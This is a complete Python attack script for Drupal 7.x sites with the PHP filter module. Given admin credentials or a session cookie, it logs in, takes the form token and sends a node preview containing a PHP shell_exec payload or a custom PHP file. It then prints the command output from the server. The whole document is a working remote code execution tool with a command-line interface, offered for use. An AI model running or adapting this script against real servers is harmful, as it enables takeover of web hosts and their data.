#!/usr/bin/env python
# useless authenticated drupal php filter code execution
# hey, look at the timing! wonder where I first saw this...
#
# this is not new, and tbh it would only be a tiny bit slower to do it through
# the web ui. i mean, the prerequisite is that you have admin creds, so why
# wouldn't you just do that
#
# expected to work with anything that has the 'php filter' module (which adds
# an option to add php pages through the admin ui)
#
# most likely won't work with 8.x and up, since php filter was removed from core
# TODO turn on php filter when it's off
from __future__ import print_function

import binascii
import os

import requests
from bs4 import BeautifulSoup


SHELL_PAYLOAD_BASE = '<?php print shell_exec("{}") ?>'
LOGIN_BASE = 'http://{}/node'
ADMIN_BASE = 'http://{}/admin'
CONTENT_ADD_BASE = 'http://{}/node/add/page'


def authn(host, username, password=''):
    '''Attempt to return a session cookie for the given credentials. Returns
    the cookie as a string on success, or None on failure.

    Drupal sends a Set-Cookie header for successful authentication attempts.
    '''
    login_url = LOGIN_BASE.format(host)
    # the actual form sends other data (eg form_build_id) but it doesn't
    # seem to matter
    login_data = {
        'name': username,
        'pass': password,
        'form_id': 'user_login_block',  # necessary
        # 'op': 'Log in'  # seemingly not necessary
    }
    # requests.post follows redirects by default (if, eg, there's https redir)
    # cookies don't persist across redirects in requests lib, so for my use case,
    # I'm just ignoring redirects
    resp = requests.post(login_url, data=login_data, allow_redirects=False)
    if 'set-cookie' in resp.headers:
        return resp.cookies


# TODO
def preview_exec(host, cookies, payload):
    '''Use the preview functionality to execute PHP'''
    preview_url = CONTENT_ADD_BASE.format(host)
    add_content_page = requests.get(preview_url, cookies=cookies)
    soup = BeautifulSoup(add_content_page.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'form_token'}).get('value')
    title = binascii.b2a_hex(os.urandom(8))
    # yeesh
    # everything's gotta be normal text here (as in not urlencoded) or it can
    # cause a hard-to-debug 500 after urlencode
    preview_data = {
        'title': title,  # this page won't persist, but title is required anyway
        'body[und][0][value]': payload,
        'body[und][0][format]': 'php_code',
        'form_token': csrf_token,
        'form_id': 'page_node_form',
        'op': 'Preview'
    }
    resp = requests.post(preview_url, data=preview_data, cookies=cookies)
    return resp


if __name__ == '__main__':
    import argparse
    import sys

    parser = argparse.ArgumentParser(description='Drupal 7.x PHP Filter authenticated code execution (this is intended functionality btw, not a Drupal bug)')
    parser.add_argument('host')
    parser.add_argument('-u', '--username', help='admin username')
    parser.add_argument('-p', '--password', help='admin password')
    parser.add_argument('-c', '--cookie', help='admin session cookie (key=val)')
    parser.add_argument('--payload',
                        metavar='PAYLOAD',
                        help='Shell command (to be executed via PHP shell_exec) or \'@/path/to/file.php\' for full custom PHP',
                        type=str,
                        default='id')

    args = parser.parse_args()
    if not args.username and not args.cookie:
        parser.print_help()
        print('\nMust provide one of username/password or cookie')
        sys.exit(1)
    host, username, password = args.host, args.username, args.password

    if args.cookie:
        key, val = args.cookie.split('=')  # who knows if this works!
        cookies = {key: val}
        print('Using provided session cookie')
    else:
        cookies = authn(host, username, password)

    # check if we're actually admin
    if not requests.get(ADMIN_BASE.format(args.host), cookies=cookies).ok:
        raise Exception('Could not get admin page (user not an admin?)')
    print('Logged in to {} as Drupal admin {}...'.format(host, username or '(username not specified)'))

    if args.payload.startswith('@'):
        payload = open(args.payload.split('@', 1)[-1]).read()
    else:
        payload = SHELL_PAYLOAD_BASE.format(args.payload)

    exec_resp = preview_exec(host, cookies, payload)
    if not exec_resp.ok:
        raise Exception('Bad response from server')
    print('Sent payload: {}'.format(args.payload))

    soup = BeautifulSoup(exec_resp.text, 'html.parser')
    # no idea if this is a stable way to find the output
    # there's a 'trimmed' preview and a full preview, full preview is second
    full_result_html = soup.find_all('div', {'class': 'node-unpublished'})[-1]
    result_text = full_result_html.find('div', {'class': 'content'}).text
    print('Result:')
    print(result_text)
